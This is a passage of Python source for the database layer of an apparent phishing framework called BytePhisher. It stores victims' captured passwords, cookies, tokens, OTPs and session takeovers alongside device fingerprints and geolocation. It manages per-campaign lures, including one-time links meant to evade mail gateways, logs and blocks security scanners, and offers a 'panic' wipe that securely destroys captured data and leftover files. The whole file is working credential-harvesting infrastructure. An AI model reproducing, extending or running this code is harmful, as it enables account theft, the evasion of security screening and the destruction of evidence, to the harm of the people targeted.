# BytePhisher - SQLite capture store.
#
# Tables:
#   captures (every form submission, tagged with its campaign)
#   visitors (de-duplicated by ip+ua, so "unique visitors" is truthful)
#   blocked  (gated-out visitors, with the reason)
#
# Thread safety: ONE CONNECTION PER THREAD (threading.local), writes serialized
# by a lock, WAL journal. Sharing a single sqlite3 connection between threads
# with check_same_thread=False is NOT safe: the HTTP server, the dashboard SSE
# generator and the TUI all query at the same time, and concurrent statement
# execution on one connection corrupted memory and SEGFAULTED the process
# (the failure mode: pytest tests/test_proxy.py tests/test_packaging_stream_reuse.py -> "Fatal Python
# error: Segmentation fault ... core/capture.py in since()").
import contextlib
import glob
import json
import os
import sqlite3
import threading
import time


def _csv_safe(v):
    """Neutralise spreadsheet formula injection.

    A captured value beginning with = + - @ (or tab/CR) is executed as a formula
    by Excel/Sheets when the operator opens the export. Prefixing an apostrophe
    keeps the value readable and inert.
    """
    t = "" if v is None else str(v)
    if t[:1] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + t
    return t


LIVE_ROWS_PER_SESSION = 2000     # newest rows kept per session


@contextlib.contextmanager
def _atomic_write(path, mode="w", encoding="utf-8", newline=None):
    """Open `path` for writing via a sibling temp file + os.replace().

    DEFECT: exports were written straight to the destination, so open("w") truncated the
    operator's previous export before a byte of the new one was written and a crash or a
    full disk left a half (or empty) file - measured: a failed export_json wiped a
    pre-existing file to zero bytes. A temp file + atomic replace means a reader only
    ever sees a complete export, or the previous one.
    """
    tmp = f"{path}.tmp-{os.getpid()}-{threading.get_ident()}"
    try:
        with open(tmp, mode, encoding=encoding, newline=newline) as f:
            yield f
        os.replace(tmp, path)
    except BaseException:
        with contextlib.suppress(Exception):
            os.remove(tmp)
        raise


_ID_KEYS = ("email", "username", "login", "user", "user_name", "email_address",
            "user_id", "username_or_email", "email_or_username", "userid", "login_id",
            "loginfmt", "session_key", "account", "identifier", "phone", "mobile")
_PW_KEYS = ("password", "passw", "pwd", "passwd", "pass", "passphrase", "pass_code")


def identity_of(fields):
    """Who this is, from a captured field set.

    A fixed list of names missed `loginfmt` (Microsoft) and `session_key` (LinkedIn), so
    those sessions showed no identity anywhere in the operator's views. The fallback is
    the first field that is not a secret.
    """
    fields = fields or {}
    for k, v in fields.items():
        if k.lower() in _ID_KEYS and str(v or "").strip():
            return str(v).strip()
    for k, v in fields.items():
        if k.lower() in _PW_KEYS:
            continue
        text = str(v or "").strip()
        if text and len(text) <= 254:
            return text
    return ""


def _challenge_only(rec):
    """A session whose ONLY content is a challenge outcome (a scanner's footprint)."""
    if not isinstance(rec, dict):
        return False
    if not (rec.get("meta") or {}).get("challenge"):
        return False
    if rec.get("state") and rec.get("state") != "opened":
        return False
    for key in ("credentials", "cookies", "oauth", "evidence", "tokens", "lure", "otp"):
        if rec.get(key):
            return False
    return True


class CaptureDB:
    def __init__(self, db_path):
        self.db_path = db_path
        d = os.path.dirname(db_path)
        if d:
            os.makedirs(d, exist_ok=True)
        # per-thread connections + a write lock: readers never share a
        # connection with the writer, so no cross-thread sqlite3 use at all.
        # RLock, not Lock: a write path takes the lock and then creates the
        # thread's connection (which also registers it), and a plain Lock would
        # deadlock on that nested acquire.
        self._local = threading.local()
        self._lock = threading.RLock()
        # bound the rows an unauthenticated verify flood can create (see session_save)
        self._challenge_cap = 500
        self._challenge_rows = 0
        # thread ident -> connection. A dict, not a list: the HTTP server runs one thread
        # per connection and every one of them opened a connection here that was retained
        # forever (measured: 1 -> 151 connections after 150 short-lived request threads),
        # so a long campaign leaked sqlite handles without bound. Keying by ident lets a
        # finished thread's connection be reaped (see _reap_conns).
        self._conns = {}
        self._closed = False
        c = self._conn()
        c.executescript("""
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts REAL,
            source_url TEXT,
            ip TEXT,
            city TEXT,
            country TEXT,
            isp TEXT,
            ua TEXT,
            device TEXT,
            fields_json TEXT,
            is_cred INTEGER DEFAULT 0,
            campaign TEXT
        );
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            ua TEXT,
            first_seen REAL,
            hits INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS blocked (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts REAL,
            ip TEXT,
            country TEXT,
            reason TEXT
        );
        CREATE TABLE IF NOT EXISTS intel (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts REAL,
            sid TEXT,
            ip TEXT,
            city TEXT,
            country TEXT,
            isp TEXT,
            ua TEXT,
            device_token TEXT,
            headless INTEGER DEFAULT 0,
            vpn INTEGER DEFAULT 0,
            risk INTEGER DEFAULT 0,
            waves TEXT,
            summary_json TEXT,
            data_json TEXT
        );
        CREATE TABLE IF NOT EXISTS lures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT UNIQUE,
            phishlet TEXT,
            campaign TEXT,
            label TEXT,
            kind TEXT,
            max_uses INTEGER DEFAULT 0,
            uses INTEGER DEFAULT 0,
            created REAL,
            last_used REAL,
            opens INTEGER DEFAULT 0,
            visitors TEXT,
            conversions INTEGER DEFAULT 0,
            active INTEGER DEFAULT 1,
            meta TEXT,
            notes TEXT
        );
        CREATE TABLE IF NOT EXISTS sessions (
            sid TEXT PRIMARY KEY,
            ts REAL,
            updated REAL,
            phishlet TEXT,
            campaign TEXT,
            lure TEXT,
            ip TEXT,
            country TEXT,
            city TEXT,
            isp TEXT,
            ua TEXT,
            device_token TEXT,
            ja3 TEXT,
            state TEXT,
            creds_json TEXT,
            cookies_json TEXT,
            tokens_json TEXT,
            timeline_json TEXT,
            takeovers_json TEXT,
            record_json TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_lures_token ON lures(token);
        CREATE INDEX IF NOT EXISTS idx_sessions_updated ON sessions(updated);
        CREATE INDEX IF NOT EXISTS idx_intel_sid ON intel(sid);
        CREATE INDEX IF NOT EXISTS idx_intel_token ON intel(device_token);
        CREATE TABLE IF NOT EXISTS live_input (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sid TEXT NOT NULL,
            ts REAL NOT NULL,
            kind TEXT,
            field TEXT,
            value TEXT,
            events_json TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_live_sid ON live_input(sid, ts);
        """)
        # Visitor de-duplication depends on a UNIQUE(ip, ua) index: without it
        # every page view inserted a new row and "unique visitors" was wrong.
        try:
            c.execute(
                "CREATE UNIQUE INDEX IF NOT EXISTS idx_visitors_ip_ua ON visitors(ip, ua)")
        except sqlite3.IntegrityError:
            # legacy DB that already accumulated duplicates - collapse then retry
            c.execute("""DELETE FROM visitors WHERE id NOT IN
                         (SELECT MIN(id) FROM visitors GROUP BY ip, ua)""")
            c.execute(
                "CREATE UNIQUE INDEX IF NOT EXISTS idx_visitors_ip_ua ON visitors(ip, ua)")
        # Migration: DBs created before campaign/risk support get the columns.
        self._ensure_column("captures", "campaign", "TEXT")
        self._ensure_column("captures", "risk", "INTEGER DEFAULT 0")
        self._ensure_column("captures", "risk_reasons", "TEXT")
        c.commit()

    # ------------------------------------------------------------ connections
    def _conn(self):
        """The calling thread's connection, created on first use."""
        if self._closed:
            raise RuntimeError("CaptureDB is closed")
        c = getattr(self._local, "conn", None)
        if c is None:
            # a fresh install (or a new $BYTEPHISHER_HOME) has no data/ yet, and
            # sqlite3.connect raises FileNotFoundError on a missing directory - measured
            # on the first CLI run against an empty home
            if self.db_path and self.db_path != ":memory:":
                parent = os.path.dirname(os.path.abspath(self.db_path))
                if parent:
                    with contextlib.suppress(OSError):
                        os.makedirs(parent, exist_ok=True)
            c = sqlite3.connect(self.db_path, timeout=15)
            c.execute("PRAGMA journal_mode=WAL")
            # deleted rows must not be recoverable from the file: a panic
            # wipe is worthless if the pages still hold the plaintext
            c.execute("PRAGMA secure_delete=ON")
            # a second writer must wait, not raise "database is locked"
            c.execute("PRAGMA busy_timeout=15000")
            c.execute("PRAGMA synchronous=NORMAL")
            self._local.conn = c
            with self._lock:
                self._conns[threading.get_ident()] = c
                # keep the registry bounded to live threads (one per HTTP connection)
                if len(self._conns) > 64:
                    self._reap_conns()
        return c

    def _reap_conns(self):
        """Close and drop the connections of threads that have exited.

        DEFECT: the registry held one connection per request thread for the life of the
        process, so a campaign that served thousands of short-lived connections
        accumulated thousands of sqlite handles (file descriptors and memory) and never
        released them. Each connection is used only by the thread that created it
        (threading.local), so once that thread is gone the handle is safe to close.
        """
        alive = {t.ident for t in threading.enumerate()}
        for ident in [i for i in self._conns if i not in alive]:
            conn = self._conns.pop(ident, None)
            if conn is not None:
                with contextlib.suppress(Exception):
                    conn.close()

    @property
    def conn(self):
        """Kept for callers/tests that reach for the raw handle."""
        return self._conn()

    def _ensure_column(self, table, column, decl):
        cols = [r[1] for r in self.conn.execute(f"PRAGMA table_info({table})")]
        if column not in cols:
            self.conn.execute(f"ALTER TABLE {table} ADD COLUMN {column} {decl}")

    def _upsert_visitor(self, ip, ua):
        self.conn.execute(
            "INSERT INTO visitors (ip, ua, first_seen, hits) VALUES (?,?,?,1) "
            "ON CONFLICT(ip, ua) DO UPDATE SET hits = hits + 1",
            (ip or "unknown", ua or "unknown", time.time()))

    def log_visit(self, ip, ua):
        """Page view (no credentials) - keeps visitor stats meaningful."""
        with self._lock:
            self._upsert_visitor(ip, ua)
            self.conn.commit()

    def record(self, source_url, ip, city, country, isp, ua, device, fields, is_cred,
               campaign=None, risk=0, risk_reasons=None):
        with self._lock:
            self.conn.execute(
                "INSERT INTO captures (ts, source_url, ip, city, country, isp, ua, device,"
                " fields_json, is_cred, campaign, risk, risk_reasons)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (time.time(), source_url, ip, city or "", country or "", isp or "",
                 ua, device, json.dumps(fields, default=str), 1 if is_cred else 0,
                 campaign or "", int(risk or 0),
                 json.dumps(risk_reasons or [], default=str)))
            self._upsert_visitor(ip, ua)
            self.conn.commit()

    def all(self, limit=200, campaign=None):
        cols = ("ts, source_url, ip, city, country, isp, ua, device, fields_json,"
                " is_cred, campaign, risk, risk_reasons")
        if campaign:
            rows = self.conn.execute(
                f"SELECT {cols} FROM captures WHERE campaign=? ORDER BY id DESC LIMIT ?",
                (campaign, limit)).fetchall()
        else:
            rows = self.conn.execute(
                f"SELECT {cols} FROM captures ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()
        out = []
        for r in rows:
            try:
                reasons = json.loads(r[12]) if r[12] else []
            except Exception:
                reasons = []
            out.append({
                "ts": r[0], "source_url": r[1], "ip": r[2], "city": r[3],
                "country": r[4], "isp": r[5], "ua": r[6], "device": r[7],
                "fields": json.loads(r[8]) if r[8] else {},
                "is_cred": bool(r[9]), "campaign": r[10] or "",
                "risk": int(r[11] or 0), "risk_reasons": reasons,
            })
        return out

    def stats(self, campaign=None):
        where = " WHERE campaign=?" if campaign else ""
        args = (campaign,) if campaign else ()
        total = self.conn.execute(f"SELECT COUNT(*) FROM captures{where}", args).fetchone()[0]
        creds = self.conn.execute(
            f"SELECT COUNT(*) FROM captures{where}{' AND' if campaign else ' WHERE'} is_cred=1",
            args).fetchone()[0]
        # "credible" = credential capture from a low-risk (human-looking) source
        credible = self.conn.execute(
            f"SELECT COUNT(*) FROM captures{where}{' AND' if campaign else ' WHERE'}"
            " is_cred=1 AND risk < 30", args).fetchone()[0]
        if campaign:
            # visitors are not campaign-tagged in the schema, so scope them to
            # the distinct (ip, ua) pairs that actually submitted to THIS
            # campaign - the global count made every campaign report wrong
            visitors = self._conn().execute(
                "SELECT COUNT(*) FROM (SELECT DISTINCT ip, ua FROM captures "
                "WHERE campaign=?)", (campaign,)).fetchone()[0]
        else:
            visitors = self._conn().execute("SELECT COUNT(*) FROM visitors").fetchone()[0]
        return {"total_captures": total, "credentials": creds, "visitors": visitors,
                "credible_credentials": credible}

    def log_blocked(self, ip, country, reason):
        """Gated visitor refused - recorded so reporting can state the real ratio."""
        with self._lock:
            self.conn.execute("INSERT INTO blocked (ts, ip, country, reason) VALUES (?,?,?,?)",
                              (time.time(), ip or "", country or "", reason or ""))
            self.conn.commit()

    def blocked_list(self, limit=100):
        """The most recent refusals, newest first."""
        rows = self.conn.execute(
            "SELECT ts, ip, country, reason FROM blocked ORDER BY id DESC LIMIT ?",
            (int(limit),)).fetchall()
        return [{"ts": r[0], "ip": r[1], "country": r[2], "reason": r[3]} for r in rows]

    def blocked_stats(self):
        rows = self.conn.execute(
            "SELECT reason, COUNT(*) FROM blocked GROUP BY reason ORDER BY COUNT(*) DESC").fetchall()
        total = self.conn.execute("SELECT COUNT(*) FROM blocked").fetchone()[0]
        return {"total_blocked": total, "by_reason": [{"reason": r[0], "count": r[1]} for r in rows]}

    def max_id(self):
        row = self.conn.execute("SELECT COALESCE(MAX(id), 0) FROM captures").fetchone()
        return int(row[0] or 0)

    def since(self, after_id, limit=100):
        """Captures newer than `after_id` (ascending) - the SSE feed uses this so
        the dashboard pushes rows instead of polling the whole table.

        Returns [] once the store is closed, so a streaming generator winding
        down cannot raise (or touch a closed handle)."""
        if self._closed:
            return []
        rows = self._conn().execute(
            "SELECT id, ts, source_url, ip, city, country, isp, ua, device, fields_json,"
            " is_cred, campaign, risk, risk_reasons FROM captures WHERE id > ?"
            " ORDER BY id ASC LIMIT ?", (int(after_id or 0), limit)).fetchall()
        out = []
        for r in rows:
            try:
                reasons = json.loads(r[13]) if r[13] else []
            except Exception:
                reasons = []
            out.append({
                "id": r[0], "ts": r[1], "source_url": r[2], "ip": r[3], "city": r[4],
                "country": r[5], "isp": r[6], "ua": r[7], "device": r[8],
                "fields": json.loads(r[9]) if r[9] else {}, "is_cred": bool(r[10]),
                "campaign": r[11] or "", "risk": int(r[12] or 0), "risk_reasons": reasons,
            })
        return out

    def reuse_stats(self, min_count=2):
        """Credentials seen more than once across submissions/campaigns.

        A repeated identity means the same person was targeted again; a repeated
        password across different identities is a password-reuse finding. Both are
        stronger evidence than a single capture, so reports state them explicitly.
        """
        pw_keys = _PW_KEYS

        def pick(fields, keys):
            for k, v in (fields or {}).items():
                if k.lower() in keys and str(v).strip():
                    return str(v).strip()
            return None

        def pick_identity(fields):
            """The identity, or the first non-secret field when the name is unusual.

            a form that posts `loginfmt` (Microsoft) or `session_key`
            (LinkedIn) produced NO identity, so reuse detection silently saw nothing.
            """
            return identity_of(fields) or None

        identities, passwords = {}, {}
        for r in self.all(limit=1000000):
            if not r.get("is_cred"):
                continue
            f = r.get("fields") or {}
            ident = pick_identity(f)
            pw = pick(f, pw_keys)
            if ident:
                e = identities.setdefault(ident, {"count": 0, "campaigns": set(),
                                                  "first": r["ts"], "last": r["ts"]})
                e["count"] += 1
                e["campaigns"].add(r["campaign"] or "")
                e["last"] = max(e["last"], r["ts"])
            if pw:
                e = passwords.setdefault(pw, {"count": 0, "identities": set(), "campaigns": set()})
                e["count"] += 1
                if ident:
                    e["identities"].add(ident)
                e["campaigns"].add(r["campaign"] or "")

        rep_id = [{"identity": k, "count": v["count"],
                   "campaigns": sorted(c for c in v["campaigns"] if c),
                   "first_seen": v["first"], "last_seen": v["last"]}
                  for k, v in identities.items() if v["count"] >= min_count]
        rep_pw = [{"password": k, "count": v["count"],
                   "identities": sorted(v["identities"]),
                   "campaigns": sorted(c for c in v["campaigns"] if c)}
                  for k, v in passwords.items()
                  if v["count"] >= min_count or len(v["identities"]) >= min_count]
        rep_id.sort(key=lambda x: -x["count"])
        rep_pw.sort(key=lambda x: -x["count"])
        return {"repeated_identities": rep_id, "repeated_passwords": rep_pw,
                "total_reused_identities": len(rep_id),
                "total_reused_passwords": len(rep_pw)}

    def campaigns(self):
        """Per-campaign breakdown for the dashboard / reporting."""
        rows = self.conn.execute(
            "SELECT COALESCE(NULLIF(campaign,''), '(untagged)') c, COUNT(*),"
            " SUM(is_cred) FROM captures GROUP BY c ORDER BY COUNT(*) DESC").fetchall()
        return [{"campaign": r[0], "captures": r[1], "credentials": r[2] or 0} for r in rows]

    def export_json(self, path, campaign=None):
        """Machine-readable dump (same shape as the API) for downstream tooling."""
        devices = []
        for r in self.intel_list(limit=1000000):
            rec = self.intel_get(r["id"])
            if rec:
                devices.append(rec)
        with _atomic_write(path) as f:
            json.dump({"exported_at": time.time(),
                       "stats": self.stats(campaign=campaign),
                       "intel_stats": self.intel_stats(),
                       "campaigns": self.campaigns(),
                       "captures": self.all(limit=1000000, campaign=campaign),
                       "devices": devices},
                      f, indent=2, default=str)
        return path

    def export_csv(self, path, campaign=None):
        import csv
        rows = self.all(limit=1000000, campaign=campaign)
        with _atomic_write(path, newline="", encoding="utf-8-sig") as f:
            w = csv.writer(f)
            w.writerow(["ts", "campaign", "source_url", "ip", "city", "country",
                        "isp", "device", "is_cred", "risk", "risk_reasons", "fields"])
            for c in rows:
                w.writerow([
                    c["ts"], _csv_safe(c["campaign"]), _csv_safe(c["source_url"]),
                    _csv_safe(c["ip"]), _csv_safe(c["city"]),
                    _csv_safe(c["country"]), _csv_safe(c["isp"]), _csv_safe(c["device"]),
                    "YES" if c["is_cred"] else "NO",
                    c["risk"], _csv_safe("; ".join(c["risk_reasons"])),
                    _csv_safe("; ".join(f"{k}={_csv_safe(v)}"
                                        for k, v in c["fields"].items()))
                ])
        return path

    def wipe(self, what="all"):
        """Drop the campaign's rows and reclaim the space.

        For a panic: the operator decides a campaign is burned and wants the store
        empty, not merely stopped. `what` is "all" or a comma-separated subset of
        captures, visitors, sessions, intel, live_input, blocked, lures.
        """
        tables = ("captures", "visitors", "sessions", "intel", "live_input",
                  "blocked", "lures")
        want = tables if str(what or "all").lower() == "all" else tuple(
            t.strip() for t in str(what).split(",") if t.strip() in tables)
        removed = {}
        failed = {}
        with self._lock:
            for t in want:
                try:
                    removed[t] = self._conn().execute(
                        f"SELECT COUNT(*) FROM {t}").fetchone()[0]
                    self._conn().execute(f"DELETE FROM {t}")
                except Exception as e:
                    failed[t] = f"{type(e).__name__}: {e}"
                    removed.pop(t, None)
            try:
                self._conn().commit()
            except Exception as e:
                failed["commit"] = f"{type(e).__name__}: {e}"
            # A wipe is a panic action ("the campaign is burned, destroy the captures"),
            # so a delete that did not stick must never be reported as one that did: the
            # count used to be recorded before the DELETE, inside a suppress(), so a
            # failed wipe returned a full "removed" dict while every row was still there.
            for t in list(removed):
                try:
                    left = self._conn().execute(
                        f"SELECT COUNT(*) FROM {t}").fetchone()[0]
                except Exception as e:
                    left, failed[t] = 1, f"{type(e).__name__}: {e}"
                if left:
                    failed[t] = f"{left} row(s) survived the delete"
                    removed.pop(t, None)
            # WAL keeps the pages in the -wal file until a checkpoint, so a wipe
            # followed by a hard exit (crash, SIGKILL, power loss) left the plaintext
            # on disk. CHECKPOINT(TRUNCATE) folds the WAL back and empties it, and
            # VACUUM then rewrites the file; both are best-effort by design.
            with contextlib.suppress(Exception):
                self._conn().execute("PRAGMA wal_checkpoint(TRUNCATE)")
            with contextlib.suppress(Exception):
                self._conn().execute("VACUUM")
            with contextlib.suppress(Exception):
                self._conn().execute("PRAGMA wal_checkpoint(TRUNCATE)")
        if str(what or "all").lower() == "all":
            # a full wipe is a panic: the files that outlive the rows go too
            files = self.destroy_leftovers()
            if files:
                removed["files"] = len(files)
        if failed:
            removed["failed"] = failed
        return removed

    def destroy_leftovers(self, dirs=None, patterns=None):
        """Remove the files a wipe does not cover.

        The SQLite store is not the only place a campaign writes: takeover screenshots and
        per-session result.json files, the tunneler logs (which hold the public URL), the
        token set spooled after a failed vault write, the domain pool and any generated QR
        image all survive `wipe()`. This runs after a full wipe (`/kill`, `--kill --yes`),
        and returns the list of paths it removed so the caller can report them.

        `dirs` defaults to the campaign's own artefact directories; `patterns` to the
        spooled files. Neither touches `templates/` or `bin/`: those are not campaign data.
        """
        dirs = tuple(dirs) if dirs is not None else ("takeover", "logs", "screenshots",
                                                     "evidence")
        patterns = tuple(patterns) if patterns is not None else (
            "dc-failed-*.json", "domains.json", "pool.json", "qr-*.png", "qr-*.svg",
            "campaign-*.png", "blocklist.txt",
        )
        roots = []
        home = getattr(self, "home", "") or ""
        data_dir = os.path.dirname(self.db_path) or "."
        for candidate in (home, os.path.dirname(data_dir), data_dir):
            if candidate and candidate not in roots:
                roots.append(candidate)
        removed = []
        for d in dirs:
            for base in roots:
                path = os.path.join(base, d)
                if not os.path.isdir(path):
                    continue
                for root, _sub, files in os.walk(path):
                    for f in files:
                        p = os.path.join(root, f)
                        with contextlib.suppress(Exception):
                            os.remove(p)
                            removed.append(p)
        for base in roots:
            if not os.path.isdir(base):
                continue
            for pattern in patterns:
                for p in glob.glob(os.path.join(base, pattern)):
                    if os.path.isfile(p):
                        with contextlib.suppress(Exception):
                            os.remove(p)
                            removed.append(p)
        # The WAL sidecars are NOT removed here: a live connection with its WAL file
        # deleted out from under it is how a store gets corrupted. `wipe()` already runs
        # `wal_checkpoint(TRUNCATE)`, which empties them.
        return removed

    def close(self):
        """Mark closed and release every connection this store opened.

        A new statement after close() raises RuntimeError instead of touching a
        freed handle, which is what turned a shutdown race into a segfault."""
        self._closed = True
        with self._lock:
            conns, self._conns = list(self._conns.values()), {}
        for c in conns:
            with contextlib.suppress(Exception):
                c.close()

    # ------------------------------------------------------------- intel ----
    def log_intel(self, sid, ip, city, country, isp, ua, summary, raw, risk=0):
        """Store one device-intelligence record (full raw dump + summary)."""
        with self._lock:
            self._conn().execute(
                "INSERT INTO intel (ts, sid, ip, city, country, isp, ua, device_token,"
                " headless, vpn, risk, waves, summary_json, data_json)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (time.time(), sid or "", ip or "", city or "", country or "", isp or "",
                 ua or "", (summary.get("fingerprint") or {}).get("device_token") or "",
                 int((summary.get("automation") or {}).get("headless_score") or 0),
                 int((summary.get("network_risk") or {}).get("vpn_suspected_score") or 0),
                 int(risk or 0),
                 ",".join(str(w) for w in (summary.get("waves") or [])),
                 json.dumps(summary, default=str), json.dumps(raw, default=str)))
            self._conn().commit()

    def intel_list(self, limit=50):
        rows = self._conn().execute(
            "SELECT id, ts, sid, ip, country, device_token, headless, vpn, risk, ua,"
            " waves, summary_json FROM intel ORDER BY id DESC LIMIT ?",
            (limit,)).fetchall()
        out = []
        for r in rows:
            summary = {}
            with contextlib.suppress(Exception):
                summary = json.loads(r[11] or "{}")
            rec = dict(summary)      # browser/os/device_class land at top level
            rec.update({"id": r[0], "ts": r[1], "sid": r[2], "ip": r[3],
                        "country": r[4], "device_token": r[5], "headless": r[6],
                        "vpn": r[7], "risk": r[8], "ua": r[9], "waves": r[10]})
            out.append(rec)
        return out

    def intel_get(self, key):
        """Full record by row id, session id, or 'latest'."""
        k = str(key or "latest")
        if k in ("latest", "last", ""):
            row = self._conn().execute(
                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
                " FROM intel ORDER BY id DESC LIMIT 1").fetchone()
        elif k.isdigit():
            row = self._conn().execute(
                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
                " FROM intel WHERE id=?", (int(k),)).fetchone()
        else:
            row = self._conn().execute(
                "SELECT id, ts, sid, ip, city, country, isp, ua, summary_json, data_json"
                " FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1", (k,)).fetchone()
        if not row:
            return None
        summary = {}
        try:
            summary = json.loads(row[8] or "{}")
        except Exception:
            summary = {}
        raw = {}
        try:
            raw = json.loads(row[9] or "{}")
        except Exception:
            raw = {}
        rec = dict(summary)
        rec.update({"id": row[0], "ts": row[1], "sid": row[2], "ip": row[3],
                    "city": row[4], "country": row[5], "isp": row[6],
                    "user_agent": summary.get("user_agent") or row[7], "raw": raw})
        return rec

    def intel_for_session(self, sid):
        """Raw merged module map for a session - what the next wave must extend."""
        row = self._conn().execute(
            "SELECT data_json FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1",
            (sid or "",)).fetchone()
        if not row:
            return {}
        try:
            data = json.loads(row[0] or "{}")
            return data.get("mods") or {}
        except Exception:
            return {}

    def intel_update(self, sid, summary, raw, risk=0):
        """Replace the newest record for a session (a later wave arrived)."""
        with self._lock:
            row = self._conn().execute(
                "SELECT id FROM intel WHERE sid=? ORDER BY id DESC LIMIT 1",
                (sid or "",)).fetchone()
            if not row:
                return None
            self._conn().execute(
                "UPDATE intel SET ts=?, device_token=?, headless=?, vpn=?, risk=?,"
                " waves=?, summary_json=?, data_json=? WHERE id=?",
                (time.time(), (summary.get("fingerprint") or {}).get("device_token") or "",
                 int((summary.get("automation") or {}).get("headless_score") or 0),
                 int((summary.get("network_risk") or {}).get("vpn_suspected_score") or 0),
                 int(risk or 0), ",".join(str(w) for w in (summary.get("waves") or [])),
                 json.dumps(summary, default=str), json.dumps(raw, default=str), row[0]))
            self._conn().commit()
        return row[0]

    # ---------------------------------------------------------- scanners ----
    def record_scanner(self, ip, ua, reasons, score, path="", sid=""):
        """A visit that was refused: source, user agent and the deciding evidence.

        Stored in `captures` with device='scanner' so the dashboard, exports and
        the risk view all see it without a second table.
        """
        with self._lock:
            self.conn.execute(
                "INSERT INTO captures (ts, source_url, ip, city, country, isp, ua,"
                " device, fields_json, is_cred, campaign, risk, risk_reasons)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (time.time(), path or "/__bh/scanner", ip or "", "", "", "",
                 ua or "", "scanner",
                 json.dumps({"_scanner": True, "_reasons": list(reasons or [])[:6],
                             "_score": score, "_sid": sid}, default=str),
                 0, "", min(100, int(score or 0)),
                 json.dumps(list(reasons or [])[:4], default=str)))
            self._upsert_visitor(ip, ua)
            self.conn.commit()
        return True

    def scanner_log(self, limit=100):
        rows = self.conn.execute(
            "SELECT ts, ip, ua, risk, risk_reasons, fields_json FROM captures"
            " WHERE device='scanner' ORDER BY ts DESC LIMIT ?", (limit,)).fetchall()
        out = []
        for r in rows:
            try:
                fields = json.loads(r[5] or "{}")
            except Exception:
                fields = {}
            try:
                reasons = json.loads(r[4] or "[]")
            except Exception:
                reasons = []
            out.append({"ts": r[0], "ip": r[1], "ua": r[2], "score": r[3],
                        "reasons": reasons, "sid": fields.get("_sid", "")})
        return out

    def scanner_stats(self):
        one = self.conn.execute(
            "SELECT COUNT(*), COUNT(DISTINCT ip) FROM captures WHERE device='scanner'"
        ).fetchone()
        return {"scanner_hits": one[0] or 0, "scanner_ips": one[1] or 0}

    # ------------------------------------------------------------- lures ----
    def lure_create(self, lure):
        with self._lock:
            cur = self._conn().execute(
                "INSERT INTO lures (token, phishlet, campaign, label, kind, max_uses,"
                " uses, created, last_used, opens, visitors, conversions, active, meta,"
                " notes) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (lure.token, lure.phishlet, lure.campaign, lure.label, lure.kind,
                 lure.max_uses, lure.uses, lure.created, lure.last_used, lure.opens,
                 json.dumps(lure.visitors), lure.conversions, 1 if lure.active else 0,
                 json.dumps(lure.meta, default=str), lure.notes))
            self._conn().commit()
            lure.id = cur.lastrowid
        return lure

    def lure_get(self, token_or_id):
        """Look a lure up by token or numeric id."""
        from .lures import Lure
        k = str(token_or_id or "")
        row = None
        if k.isdigit():
            row = self._conn().execute(
                "SELECT id, token, phishlet, campaign, label, kind, max_uses, uses,"
                " created, last_used, opens, visitors, conversions, active, meta, notes"
                " FROM lures WHERE id=?", (int(k),)).fetchone()
        if not row:
            row = self._conn().execute(
                "SELECT id, token, phishlet, campaign, label, kind, max_uses, uses,"
                " created, last_used, opens, visitors, conversions, active, meta, notes"
                " FROM lures WHERE token=?", (k,)).fetchone()
        if not row:
            return None
        return Lure(id=row[0], token=row[1], phishlet=row[2], campaign=row[3],
                    label=row[4], kind=row[5], max_uses=row[6], uses=row[7],
                    created=row[8], last_used=row[9], opens=row[10],
                    visitors=json.loads(row[11] or "[]"), conversions=row[12],
                    active=bool(row[13]), meta=json.loads(row[14] or "{}"),
                    notes=row[15] or "")

    def lure_use(self, lure, ip=""):
        """Record an open. Returns False when the lure is burned (one-time/maxed).

        The row is re-read and the UPDATE is conditional inside the lock. The caller
        resolves the lure object OUTSIDE it, so incrementing that stale object let two
        simultaneous visitors both pass the burned check and the second write
        overwrote the first: a one-time lure (max_uses=1, the feature that stops a mail
        gateway or a scanner from reusing the link) was served twice while the row
        recorded one use.
        """
        with self._lock:
            row = self._conn().execute(
                "SELECT uses, opens, max_uses, visitors FROM lures WHERE id=?",
                (lure.id,)).fetchone()
            if row is None:
                return False
            uses, opens, max_uses = int(row[0] or 0), int(row[1] or 0), int(row[2] or 0)
            try:
                visitors = json.loads(row[3] or "[]")
            except (TypeError, ValueError):
                visitors = []
            if max_uses and uses >= max_uses:
                return False
            uses += 1
            opens += 1
            if ip and ip not in visitors:
                visitors.append(ip)
            now = time.time()
            cur = self._conn().execute(
                "UPDATE lures SET uses=?, opens=?, last_used=?, visitors=? "
                "WHERE id=? AND (max_uses=0 OR uses < max_uses)",
                (uses, opens, now, json.dumps(visitors[-200:]), lure.id))
            if cur.rowcount != 1:
                # another writer took the last use between the read and the UPDATE;
                # Lure.burned is a computed property (uses >= max_uses), so the
                # refreshed count below is what marks it burned, never an assignment
                with contextlib.suppress(Exception):
                    fresh = self._conn().execute(
                        "SELECT uses FROM lures WHERE id=?", (lure.id,)).fetchone()
                    if fresh:
                        lure.uses = int(fresh[0] or 0)
                return False
            self._conn().commit()
            lure.uses, lure.opens, lure.last_used, lure.visitors = uses, opens, now, visitors
            return True

    def lure_convert(self, lure):
        with self._lock:
            lure.conversions += 1
            self._conn().execute("UPDATE lures SET conversions=? WHERE id=?",
                                 (lure.conversions, lure.id))
            self._conn().commit()
        return lure.conversions

    def lure_list(self, limit=200, active_only=False):
        from .lures import Lure
        q = ("SELECT id, token, phishlet, campaign, label, kind, max_uses, uses,"
